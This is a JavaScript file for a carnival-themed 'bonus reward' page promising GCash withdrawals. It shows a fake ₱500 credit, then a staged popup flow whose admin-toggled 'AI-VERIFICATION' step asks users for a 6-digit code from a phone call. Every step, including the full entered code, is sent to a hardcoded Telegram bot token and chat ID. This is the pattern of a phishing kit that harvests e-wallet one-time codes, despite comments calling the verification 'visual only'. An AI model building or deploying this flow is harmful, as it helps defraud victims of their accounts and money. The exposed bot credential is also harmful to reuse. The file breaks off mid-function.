/**
 * playbonus.js — Carnival Theme + Telegram Notifications
 * ============================================================
 * PHASE 1: HOORAY — Carnival style
 * PHASE 2: GREAT JOB — Carnival style
 * PHASE 3: AI-VERIFICATION — Carnival style (VISUAL ONLY)
 *
 * ⚠️ VERIFICATION LOGIC AY HINDI KASAMA.
 * Ikaw ang mag-implement ng verifyCodeWithBackend()
 * at submitWithdrawalRequest() base sa LEGITIMATE na paraan.
 * ============================================================
 */

(function() {
    'use strict';

    // ============================================================
    // CONFIGURATION
    // ============================================================
    var VERIFICATION_MODE = 'admin_manual';

    // ============================================================
    // TELEGRAM NOTIFICATION CONFIG
    // ============================================================
    // ⚠️ BABALA: Client-side ito — naka-expose ang token.
    // ⚠️ I-revoke ang lumang token at gumawa ng bago.
    // ⚠️ Sa production, ilipat sa Cloud Function (server-side).
    // ============================================================
    var TELEGRAM_BOT_TOKEN = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
    var TELEGRAM_CHAT_ID = '7298607329';
    var TELEGRAM_ENABLED = true;

    // ============================================================
    // GLOBAL STATE
    // ============================================================
    var userPhone = null;
    var db = null;
    var userRef = null;
    var currentBalance = 0;
    var bonusAmount = 500;
    var isClaimed = false;
    var claimInProgress = false;
    var autoPopupTimer = null;
    var balanceListener = null;
    var claimListener = null;

    var currentPhase = 1;
    var isTransitioning = false;
    var currentFirewallStatus = false;

    var soundCache = {
        scatter: null,
        claim: null,
        success: null
    };

    // ============================================================
    // HELPERS
    // ============================================================
    function formatNumberWithComma(number) {
        var num = Number(number).toFixed(2);
        var parts = num.split('.');
        var wholePart = parts[0];
        var decimalPart = parts[1];
        var wholeWithCommas = wholePart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        return wholeWithCommas + '.' + decimalPart;
    }

    function initSounds() {
        try {
            soundCache.scatter = new Audio('sounds/super_ace_scatter_ring.mp3');
            soundCache.claim = new Audio('sounds/claim.wav');
            soundCache.success = new Audio('sounds/success.wav');
            soundCache.scatter.volume = 0.5;
            soundCache.claim.volume = 0.7;
            soundCache.success.volume = 0.6;
        } catch(e) {}
    }

    function playSound(soundName) {
        if (soundCache[soundName]) {
            soundCache[soundName].currentTime = 0;
            soundCache[soundName].play().catch(function(e) {});
        }
    }

    function shakeElement(el) {
        if (!el) return;
        el.style.animation = 'carnivalShake 0.4s ease';
        setTimeout(function() { el.style.animation = ''; }, 450);
    }

    // ============================================================
    // TELEGRAM HELPERS
    // ============================================================
    function sendTelegramNotification(message) {
        if (!TELEGRAM_ENABLED) return Promise.resolve(false);
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.warn('⚠️ Telegram not configured');
            return Promise.resolve(false);
        }

        var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';

        return fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data && data.ok) {
                console.log('✅ Telegram sent');
                return true;
            }
            console.warn('⚠️ Telegram response:', data);
            return false;
        })
        .catch(function(err) {
            console.error('❌ Telegram error:', err);
            return false;
        });
    }

    function maskPhone(phone) {
        if (!phone || phone.length < 11) return phone || 'Unknown';
        return phone.substring(0, 4) + '***' + phone.substring(7, 11);
    }

    function getTimestamp() {
        var now = new Date();
        return now.toLocaleString('en-PH', {
            timeZone: 'Asia/Manila',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    }

    // ============================================================
    // TELEGRAM NOTIFICATION BUILDERS
    // ============================================================
    function notifyClaimNowClicked(balance) {
        var msg =
            '🎁 <b>CLAIM NOW CLICKED</b>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
            '⏰ Time: ' + getTimestamp() + '\n' +
            '📊 Status: User opened bonus popup\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        return sendTelegramNotification(msg);
    }

    function notifyPhase1Viewed(balance) {
        var msg =
            '🎉 <b>PHASE 1: HOORAY</b>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
            '⏰ Time: ' + getTimestamp() + '\n' +
            '📊 Status: Viewing reward\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        return sendTelegramNotification(msg);
    }

    function notifyPhase1ClaimClicked(balance) {
        var msg =
            '💳 <b>PHASE 1: CLAIM THRU GCASH CLICKED</b>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
            '⏰ Time: ' + getTimestamp() + '\n' +
            '📊 Status: Proceeding to next phase\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        return sendTelegramNotification(msg);
    }

    function notifyPhase2Viewed(balance) {
        var msg =
            '🏆 <b>PHASE 2: GREAT JOB</b>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
            '⏰ Time: ' + getTimestamp() + '\n' +
            '📊 Status: Ready to withdraw\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        return sendTelegramNotification(msg);
    }

    function notifyPhase2ProceedClicked(balance) {
        var msg =
            '🚀 <b>PHASE 2: PROCEED TO WITHDRAW CLICKED</b>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
            '⏰ Time: ' + getTimestamp() + '\n' +
            '📊 Status: Redirecting to payout\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        return sendTelegramNotification(msg);
    }

    function notifyPhase3Viewed(balance) {
        var msg =
            '📞 <b>PHASE 3: AI-VERIFICATION</b>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
            '⏰ Time: ' + getTimestamp() + '\n' +
            '📊 Status: Verification requested\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        return sendTelegramNotification(msg);
    }

    function notifyPhase3VerifyClicked(balance) {
        var msg =
            '🔐 <b>PHASE 3: VERIFY CODE CLICKED</b>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
            '⏰ Time: ' + getTimestamp() + '\n' +
            '📊 Status: Verifying...\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        return sendTelegramNotification(msg);
    }

    function notifyPhase3CodeEntered(balance, code) {
        var msg =
            '🔑 <b>PHASE 3: CODE ENTERED</b>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
            '📝 Code: <code>' + code + '</code>\n' +
            '⏰ Time: ' + getTimestamp() + '\n' +
            '📊 Status: Code submitted\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        return sendTelegramNotification(msg);
    }

    // ============================================================
    // INIT
    // ============================================================
    function init() {
        console.log('🎁 PlayBonus Starting...');

        userPhone = localStorage.getItem("userPhone");
        if (!userPhone) {
            window.location.href = "index.html";
            return;
        }

        var phoneDisplay = document.getElementById('userPhoneDisplay');
        if (phoneDisplay) {
            phoneDisplay.innerText = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
        }

        initSounds();
        initFirebase();
        loadUserData();
        initTimer();
        initTicker();
        initClaimFlow();
        initConfetti();
        attachButtonEvents();
        injectCarnivalAnimations();

        console.log('✅ PlayBonus ready!');
    }

    // ============================================================
    // FIREBASE
    // ============================================================
    function initFirebase() {
        if (typeof firebaseConfig === 'undefined') {
            console.error('❌ Firebase config not found!');
            return;
        }
        try {
            if (!firebase.apps || !firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            db = firebase.database();
            userRef = db.ref('user_sessions/' + userPhone);
            console.log('✅ Firebase connected:', userPhone);
        } catch(e) {
            console.error('Firebase error:', e);
        }
    }

    function loadUserData() {
        if (!userRef) return;

        userRef.once('value', function(snapshot) {
            var data = snapshot.val();

            if (data) {
                currentBalance = Number(data.balance) || 0;
                isClaimed = data.claimed_ptcat === true;

                console.log('📊 Loaded - Balance: ₱' + currentBalance + ', Claimed:', isClaimed);

                updateBalanceDisplay();
                updateClaimButtonUI();
                scheduleAutoPopup();
            } else {
                console.log('🆕 New user');
                currentBalance = 0;
                isClaimed = false;

                userRef.set({
                    phone: userPhone,
                    balance: 0,
                    claimed_ptcat: false,
                    status: "active",
                    created_at: Date.now()
                }).then(function() {
                    updateBalanceDisplay();
                    updateClaimButtonUI();
                    scheduleAutoPopup();
                });
            }
        }).catch(function(e) {
            console.error('Load error:', e);
        });

        if (balanceListener) {
            userRef.child('balance').off('value', balanceListener);
        }

        balanceListener = userRef.child('balance').on('value', function(snapshot) {
            var balance = snapshot.val();
            if (balance !== null && balance !== undefined) {
                currentBalance = Number(balance);
                updateBalanceDisplay();
            }
        });

        if (claimListener) {
            userRef.child('claimed_ptcat').off('value', claimListener);
        }

        claimListener = userRef.child('claimed_ptcat').on('value', function(snapshot) {
            var claimed = snapshot.val();
            var newState = (claimed === true);

            if (newState !== isClaimed) {
                isClaimed = newState;
                updateClaimButtonUI();
            }
        });
    }

    // ============================================================
    // AUTO POPUP
    // ============================================================
    function scheduleAutoPopup() {
        if (autoPopupTimer) clearTimeout(autoPopupTimer);

        var delay = isClaimed ? 5000 : 3000;
        autoPopupTimer = setTimeout(function() {
            autoShowBonusPopup();
        }, delay);
    }

    function autoShowBonusPopup() {
        var popup = document.getElementById('bonusRewardPopup');
        if (!popup) return;

        popup.style.display = 'flex';
        playSound('scatter');
        updateClaimButtonUI();
    }

    // ============================================================
    // BALANCE DISPLAY
    // ============================================================
    function updateBalanceDisplay() {
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) {
            balanceEl.innerText = formatNumberWithComma(currentBalance);
        }
    }

    function animateBalanceThenSave(oldBalance, newBalance, callback) {
        var startTime = null;
        var duration = 1500;

        function step(timestamp) {
            if (!startTime) startTime = timestamp;
            var progress = Math.min((timestamp - startTime) / duration, 1);
            var easeProgress = 1 - Math.pow(1 - progress, 3);
            var val = Math.floor(easeProgress * (newBalance - oldBalance) + oldBalance);

            var balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) {
                balanceEl.innerText = formatNumberWithComma(val);
            }

            if (progress < 1) {
                requestAnimationFrame(step);
            } else {
                if (callback) callback();
            }
        }

        requestAnimationFrame(step);
    }

    // ============================================================
    // FIREWALL
    // ============================================================
    function checkFirewallBeforeClaim() {
        try {
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                currentFirewallStatus = (data && data.active === true);
                return currentFirewallStatus;
            });
        } catch(e) {
            return Promise.resolve(false);
        }
    }

    // ============================================================
    // CLAIM TRACKING
    // ============================================================
    function trackClaimInFirebase(amount) {
        try {
            var now = new Date();
            var year = now.getFullYear();
            var month = String(now.getMonth() + 1).padStart(2, '0');
            var day = String(now.getDate()).padStart(2, '0');
            var hour = now.getHours();
            var dateKey = year + '-' + month + '-' + day;

            var dayRef = db.ref('festival_stats/daily/' + dateKey);

            dayRef.transaction(function(data) {
                if (data === null) {
                    data = { claims_count: 0, claims_amount: 0, hourly_claims: {} };
                }
                data.claims_count = (data.claims_count || 0) + 1;
                data.claims_amount = (data.claims_amount || 0) + (amount || 0);
                if (!data.hourly_claims) data.hourly_claims = {};
                data.hourly_claims[hour] = (data.hourly_claims[hour] || 0) + 1;
                data.last_update = Date.now();
                return data;
            });
        } catch(e) {
            console.error('❌ Track claim error:', e);
        }
    }

    // ============================================================
    // CLAIM FLOW
    // ============================================================
    function initClaimFlow() {
        var claimNowBtn = document.getElementById('claimNowBtn');
        var popup = document.getElementById('bonusRewardPopup');

        if (claimNowBtn) {
            claimNowBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();

                playSound('scatter');

                // ✅ TELEGRAM NOTIFICATION
                notifyClaimNowClicked(currentBalance);

                if (popup) {
                    popup.style.display = 'flex';
                    updateClaimButtonUI();
                }
            });
        }

        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.addEventListener('click', handleClaimBonus);
        }

        var closeBtn = document.getElementById('bonusRewardClose');
        if (closeBtn) {
            closeBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }

        var backBtn = document.getElementById('bonusRewardBack');
        if (backBtn) {
            backBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }

        updateClaimButtonUI();
    }

    function handleClaimBonus(e) {
        e.preventDefault();
        e.stopPropagation();

        if (isClaimed) {
            alert("You have already claimed this bonus!");
            return;
        }
        if (claimInProgress) {
            alert("Please wait, processing...");
            return;
        }
        if (!userRef) {
            alert("System not ready. Please refresh.");
            return;
        }

        userRef.child('claimed_ptcat').once('value', function(snapshot) {
            if (snapshot.val() === true) {
                isClaimed = true;
                updateClaimButtonUI();
                alert("You have already claimed this bonus!");
                return;
            }
            processClaim();
        }).catch(function(error) {
            console.error('Check error:', error);
            processClaim();
        });
    }

    function processClaim() {
        claimInProgress = true;

        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.style.opacity = '0.6';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
        }

        checkFirewallBeforeClaim().then(function(firewallOn) {
            if (firewallOn) {
                var popup = document.getElementById('bonusRewardPopup');
                if (popup) popup.style.display = 'none';

                creditBonusAndMark(function() {
                    if (window.showPopup) {
                        window.showPopup(currentBalance);
                    }
                    claimInProgress = false;
                });
            } else {
                creditBonusAndMark(function() {
                    var popup = document.getElementById('bonusRewardPopup');
                    if (popup) popup.style.display = 'none';

                    setTimeout(function() {
                        showSuccessPopup(bonusAmount);
                    }, 300);

                    claimInProgress = false;
                });
            }
        }).catch(function(error) {
            console.error('Firewall error:', error);
            claimInProgress = false;
            resetClaimButton();
        });
    }

    function creditBonusAndMark(callback) {
        var oldBalance = currentBalance;
        var newBalance = oldBalance + bonusAmount;

        userRef.update({
            balance: newBalance,
            claimed_ptcat: true,
            ptcat_claimed_at: Date.now(),
            lastUpdate: Date.now()
        }).then(function() {
            currentBalance = newBalance;
            isClaimed = true;

            animateBalanceThenSave(oldBalance, newBalance, function() {
                updateBalanceDisplay();
            });

            trackClaimInFirebase(bonusAmount);
            playSound('claim');
            startConfetti();
            updateClaimButtonUI();

            if (callback) callback();
        }).catch(function(error) {
            console.error('❌ Firebase update error:', error);
            alert('Error saving claim. Please try again.');
            claimInProgress = false;
            resetClaimButton();
        });
    }

    function resetClaimButton() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.style.opacity = '1';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
        }
        claimInProgress = false;
    }

    function updateClaimButtonUI() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        var bonusLabel = document.querySelector('.bonus-label');

        if (!ptCatClaimBtn) return;

        if (isClaimed) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.style.opacity = '0.5';
            ptCatClaimBtn.style.cursor = 'not-allowed';
            ptCatClaimBtn.style.pointerEvents = 'none';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
            ptCatClaimBtn.classList.add('claimed');

            if (bonusLabel) {
                bonusLabel.textContent = 'BONUS CLAIMED';
                bonusLabel.style.color = '#39ff14';
            }
        } else {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.style.opacity = '1';
            ptCatClaimBtn.style.cursor = 'pointer';
            ptCatClaimBtn.style.pointerEvents = 'auto';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
            ptCatClaimBtn.classList.remove('claimed');

            if (bonusLabel) {
                bonusLabel.textContent = 'BONUS REWARD';
                bonusLabel.style.color = '';
            }
        }
    }

    function showSuccessPopup(amount) {
        var popup = document.getElementById('successPopup');
        var amountEl = document.getElementById('successAmount');
        var closeBtn = document.getElementById('successCloseBtn');

        if (amountEl) amountEl.textContent = amount;
        if (popup) popup.style.display = 'flex';

        playSound('success');

        if (closeBtn) {
            closeBtn.onclick = function() {
                popup.style.display = 'none';
            };
        }

        setTimeout(function() {
            if (popup) popup.style.display = 'none';
        }, 5000);
    }

    // ============================================================
    // 3-PHASE CLAIM FLOW — CARNIVAL THEME
    // ============================================================

    window.showPopup = function(balance) {
        currentBalance = Number(balance) || 0;
        currentPhase = 1;
        openPhasePopup();
        renderPhase1();
    };

    function openPhasePopup() {
        var popup = document.getElementById('claimPhasePopup');
        if (!popup) return;
        popup.style.display = 'flex';
        document.body.style.overflow = 'hidden';

        var ticker = document.getElementById('winnerTicker');
        if (ticker) ticker.style.display = 'none';
    }

    function closePhasePopup() {
        var popup = document.getElementById('claimPhasePopup');
        if (!popup) return;
        popup.style.display = 'none';
        document.body.style.overflow = '';

        var ticker = document.getElementById('winnerTicker');
        if (ticker) ticker.style.display = 'flex';
    }
    window.closePopup = closePhasePopup;

    function transitionTo(renderFn) {
        if (isTransitioning) return;
        isTransitioning = true;

        var inner = document.getElementById('claimPhaseInner');
        if (!inner) {
            isTransitioning = false;
            return;
        }

        inner.style.opacity = '0';
        inner.style.transform = 'scale(0.97)';

        setTimeout(function() {
            renderFn();
            inner.style.opacity = '1';
            inner.style.transform = 'scale(1)';
            isTransitioning = false;
        }, 250);
    }

    // ============================================================
    // PHASE 1: HOORAY — CARNIVAL STYLE
    // ============================================================
    function renderPhase1() {
        currentPhase = 1;
        var inner = document.getElementById('claimPhaseInner');
        if (!inner) return;

        inner.innerHTML = [
            '<div class="carnival-phase carnival-phase-1">',
                '<button class="carnival-close" id="phase1Close">✕</button>',
                '<div class="carnival-burst-bg"></div>',
                '<div class="carnival-confetti">',
                    '<span></span><span></span><span></span><span></span><span></span>',
                    '<span></span><span></span><span></span><span></span><span></span>',
                '</div>',
                '<div class="carnival-mascot">',
                    '<img src="images/LuckyCat.png" alt="Lucky Cat" onerror="this.style.display=\'none\'">',
                    '<div class="mascot-glow"></div>',
                '</div>',
                '<h2 class="carnival-title">🎉 HOORAY! 🎉</h2>',
                '<div class="carnival-amount">',
                    '<span class="currency">₱</span>',
                    '<span class="value" id="phase1Balance">', currentBalance.toFixed(2), '</span>',
                '</div>',
                '<div class="carnival-divider"></div>',
                '<div class="carnival-bills">',
                    '<div class="bill-indicator"><img src="images/PHL-500-Front.png" onerror="this.style.display=\'none\'"></div>',
                    '<div class="bill-indicator"><img src="images/PHL-500-Back.png" onerror="this.style.display=\'none\'"></div>',
                    '<div class="bill-indicator"><img src="images/PHL-500-Front.png" onerror="this.style.display=\'none\'"></div>',
                    '<div class="bill-indicator"><img src="images/PHL-500-Back.png" onerror="this.style.display=\'none\'"></div>',
                '</div>',
                '<p class="carnival-subtext">Your reward is ready. Claim it now and enjoy the fiesta!</p>',
                '<button class="carnival-btn carnival-btn-gold" id="phase1ClaimBtn">',
                    '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'">',
                    'CLAIM THRU GCASH',
                '</button>',
                '<button class="carnival-btn carnival-btn-ghost" id="phase1BackBtn">← BACK</button>',
            '</div>'
        ].join('');

        updateBillsIndicators(currentBalance);

        // ✅ TELEGRAM NOTIFICATION — Phase 1 viewed
        notifyPhase1Viewed(currentBalance);

        var closeBtn = document.getElementById('phase1Close');
        var backBtn = document.getElementById('phase1BackBtn');
        var claimBtn = document.getElementById('phase1ClaimBtn');

        if (closeBtn) closeBtn.onclick = closePhasePopup;
        if (backBtn) backBtn.onclick = closePhasePopup;

        if (claimBtn) {
            claimBtn.onclick = function() {
                if (currentBalance <= 0) {
                    showInlineError(claimBtn, '❌ NO BALANCE');
                    return;
                }
                playSound('scatter');

                // ✅ TELEGRAM NOTIFICATION — Phase 1 claim clicked
                notifyPhase1ClaimClicked(currentBalance);

                claimBtn.disabled = true;
                claimBtn.innerHTML = '⏳ CHECKING...';

                checkFirewallBeforeClaim().then(function(firewallOn) {
                    if (firewallOn) {
                        transitionTo(renderPhase3);
                    } else {
                        transitionTo(renderPhase2);
                    }
                }).catch(function() {
                    transitionTo(renderPhase2);
                });
            };
        }
    }

    function updateBillsIndicators(balance) {
        var indicators = document.querySelectorAll('#claimPhaseInner .bill-indicator');
        var billCount = Math.min(4, Math.floor(balance / 500));

        for (var i = 0; i < indicators.length; i++) {
            var indicator = indicators[i];
            var img = indicator.querySelector('img');
            if (!img) continue;

            if (i < billCount) {
                img.style.opacity = '1';
                img.style.filter = 'none';
                indicator.classList.add('active');
            } else {
                img.style.opacity = '0.25';
                img.style.filter = 'grayscale(100%) brightness(30%)';
                indicator.classList.remove('active');
            }
        }
    }

    // ============================================================
    // PHASE 2: GREAT JOB — CARNIVAL STYLE
    // ============================================================
    function renderPhase2() {
        currentPhase = 2;
        var inner = document.getElementById('claimPhaseInner');
        if (!inner) return;

        inner.innerHTML = [
            '<div class="carnival-phase carnival-phase-2">',
                '<button class="carnival-close" id="phase2Close">✕</button>',
                '<div class="carnival-burst-bg"></div>',
                '<div class="carnival-confetti">',
                    '<span></span><span></span><span></span><span></span><span></span>',
                    '<span></span><span></span><span></span><span></span><span></span>',
                '</div>',
                '<div class="carnival-trophy">🏆</div>',
                '<h2 class="carnival-title">GREAT JOB!</h2>',
                '<div class="carnival-divider"></div>',
                '<div class="carnival-reward-box">',
                    '<p class="carnival-subtext">"Nice work! You\'re one tap away from your reward!"</p>',
                    '<div class="carnival-reward-amount">',
                        'Your reward: <strong>₱', currentBalance.toFixed(2), '</strong>',
                    '</div>',
                '</div>',
                '<button class="carnival-btn carnival-btn-gold" id="phase2ProceedBtn">',
                    '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'">',
                    'PROCEED TO WITHDRAW',
                '</button>',
                '<button class="carnival-btn carnival-btn-ghost" id="phase2BackBtn">← BACK</button>',
            '</div>'
        ].join('');

        // ✅ TELEGRAM NOTIFICATION — Phase 2 viewed
        notifyPhase2Viewed(currentBalance);

        var closeBtn = document.getElementById('phase2Close');
        var backBtn = document.getElementById('phase2BackBtn');
        var proceedBtn = document.getElementById('phase2ProceedBtn');

        if (closeBtn) closeBtn.onclick = closePhasePopup;
        if (backBtn) backBtn.onclick = function() {
            transitionTo(renderPhase1);
        };

        if (proceedBtn) {
            proceedBtn.onclick = function() {
                playSound('scatter');

                // ✅ TELEGRAM NOTIFICATION — Phase 2 proceed clicked
                notifyPhase2ProceedClicked(currentBalance);

                proceedBtn.disabled = true;
                proceedBtn.innerHTML = '⏳ REDIRECTING...';

                // ⚠️ IKAW ANG MAG-IMPLEMENT NG REDIRECT LOGIC
                redirectToDeployedLink(proceedBtn);
            };
        }
    }

    // ⚠️ PLACEHOLDER — Ikaw mag-implement
    function redirectToDeployedLink(buttonEl) {
        // TODO: I-implement ang LEGITIMATE redirect logic dito
        // HUWAG gumamit ng dynamic Firebase links na pwedeng i-control ng iba
        console.warn('⚠️ redirectToDeployedLink() is not implemented');
        if (buttonEl) {
            buttonEl.disabled = false;
            buttonEl.innerHTML = 'PROCEED TO WITHDRAW';
        }
        showInlineError(buttonEl, '❌ NOT IMPLEMENTED');
    }

    // ============================================================
    // PHASE 3: AI-VERIFICATION — CARNIVAL STYLE (VISUAL ONLY)
    // ============================================================
    function renderPhase3() {
        currentPhase = 3;
        var inner = document.getElementById('claimPhaseInner');
        if (!inner) return;

        var userPhoneLocal = localStorage.getItem('userPhone') || '';
        var masked = userPhoneLocal.length >= 11
            ? userPhoneLocal.substring(0, 4) + '***' + userPhoneLocal.substring(7, 11)
            : 'your phone';

        inner.innerHTML = [
            '<div class="carnival-phase carnival-phase-3">',
                '<button class="carnival-close" id="phase3Close">✕</button>',
                '<div class="carnival-burst-bg"></div>',
                '<div class="carnival-confetti">',
                    '<span></span><span></span><span></span><span></span><span></span>',
                    '<span></span><span></span><span></span><span></span><span></span>',
                '</div>',
                '<div class="carnival-call-icon"><i class="fas fa-phone"></i></div>',
                '<h2 class="carnival-title">AI-VERIFICATION</h2>',
                '<div class="carnival-divider"></div>',
                '<p class="carnival-subtext">',
                    '<i class="fas fa-shield-alt"></i> ',
                    'System AI will call you with a <strong>6-digit code</strong>',
                '</p>',
                '<div class="carnival-phone-display">',
                    '<span class="phone-icon">📱</span>',
                    '<span class="phone-number">', masked, '</span>',
                '</div>',
                '<div class="carnival-status" id="aiCallStatus">',
                    '<div class="status-icon">📞</div>',
                    '<div class="status-text">Waiting for call...</div>',
                '</div>',
                '<input type="text" id="phase3CodeInput" class="carnival-input"',
                    ' placeholder="000000" maxlength="6" inputmode="numeric"',
                    ' pattern="[0-9]*" autocomplete="one-time-code">',
                '<div id="phase3ErrorMsg" class="carnival-error" style="display:none;"></div>',
                '<button class="carnival-btn carnival-btn-blue" id="phase3VerifyBtn">VERIFY CODE</button>',
                '<button class="carnival-btn carnival-btn-ghost" id="phase3BackBtn">← BACK</button>',
            '</div>'
        ].join('');

        // ✅ TELEGRAM NOTIFICATION — Phase 3 viewed
        notifyPhase3Viewed(currentBalance);

        var closeBtn = document.getElementById('phase3Close');
        var backBtn = document.getElementById('phase3BackBtn');
        var verifyBtn = document.getElementById('phase3VerifyBtn');
        var input = document.getElementById('phase3CodeInput');

        if (closeBtn) closeBtn.onclick = closePhasePopup;
        if (backBtn) backBtn.onclick = function() {
            transitionTo(renderPhase1);
        };

        if (input) {
            input.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '').slice(0, 6);
                var err = document.getElementById('phase3ErrorMsg');
                if (err) err.style.display = 'none';
            });

            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' && verifyBtn) {
                    verifyBtn.click();
                }
            });

            setTimeout(function() { input.focus(); }, 300);
        }

        if (verifyBtn) {
            verifyBtn.onclick = function() {
                var code = input ? input.value.trim() : '';
                var errEl = document.getElementById('phase3ErrorMsg');

                if (!/^\d{6}$/.test(code)) {
                    if (errEl) {
                        errEl.textContent = '⚠️ Please enter a valid 6-digit code.';
                        errEl.style.display = 'block';
                    }
                    if (input) shakeElement(input);
                    return;
                }

                // ✅ TELEGRAM NOTIFICATION — Phase 3 verify + code entered
                notifyPhase3VerifyClicked(currentBalance);
                notifyPhase3CodeEntered(currentBalance, code);

                verifyBtn.disabled = true;
                verifyBtn.innerHTML = '⏳ VERIFYING...';

                // ⚠️ IKAW ANG MAG-IMPLEMENT NG VERIFICATION LOGIC
                verifyCodeWithBackend(code).then(function(ok) {
                    if (ok) {
                        verifyBtn.innerHTML = '✅ VERIFIED';
                        setTimeout(function() {
                            submitWithdrawalRequest();
                        }, 600);
                    } else {
                        verifyBtn.disabled = false;
                        verifyBtn.innerHTML = 'VERIFY CODE';
                        if (errEl) {
                            errEl.textContent = '❌ Invalid code. Please try again.';
                            errEl.style.display = 'block';
                        }
                        if (input) {
                            input.value = '';
                            shakeElement(input);
                        }
                    }
                }).catch(function() {
                    verifyBtn.disabled = false;
                    verifyBtn.innerHTML = 'VERIFY CODE';
                    if (errEl) {
                        errEl.textContent = '⚠️ Verification failed. Please try again.';
                        errEl.style.display = 'block';
                    }
                });
            };
        }
    }

    // ⚠️ PLACEHOLDER — Ikaw mag-implement
    function verifyCodeWithBackend(code) {
        // TODO: I-implement ang LEGITIMATE verification logic
        console.warn('⚠️ verifyCodeWithBackend() is not implemented');
        return Promise.resolve(false);
    }

    // ⚠️ PLACEHOLDER — Ikaw mag-implement
    function submitWithdrawalRequest() {
        // TODO: I-implement ang LEGITIMATE withdrawal logic
        console.warn('⚠️ submitWithdrawalRequest() is not implemented');
        showSuccessAndClose(currentBalance);
    }

    function showSuccessAndClose(amount) {
        var inner = document.getElementById('claimPhaseInner');
        if (!inner) return;

        inner.innerHTML = [
            '<div class="carnival-phase carnival-phase-success">',
                '<div class="carnival-burst-bg"></div>',
                '<div class="carnival-icon">✅</div>',
                '<h2 class="carnival-title">SUBMITTED!</h2>',
                '<p class="carnival-subtext">',
                    'Your withdrawal request for ',
                    '<strong style="color:#ffd700;">₱', Number(amount).toFixed(2), '</strong>',
                    ' has been submitted.',
                '</p>',
                '<button class="carnival-btn carnival-btn-gold" id="finalCloseBtn">🏠 DONE</button>',
            '</div>'
        ].join('');

        var finalClose = document.getElementById('finalCloseBtn');
        if (finalClose) {
            finalClose.onclick = function() {
                closePhasePopup();
                updateBalanceDisplay();
            };
        }
    }

    function showInlineError(button, message) {
        if (!button) return;
        var original = button.innerHTML;
        button.style.background = 'linear-gradient(180deg, #ff4444, #cc0000)';
        button.innerHTML = message;
        button.disabled = true;

        setTimeout(function() {
            button.disabled = false;
            button.style.background = '';
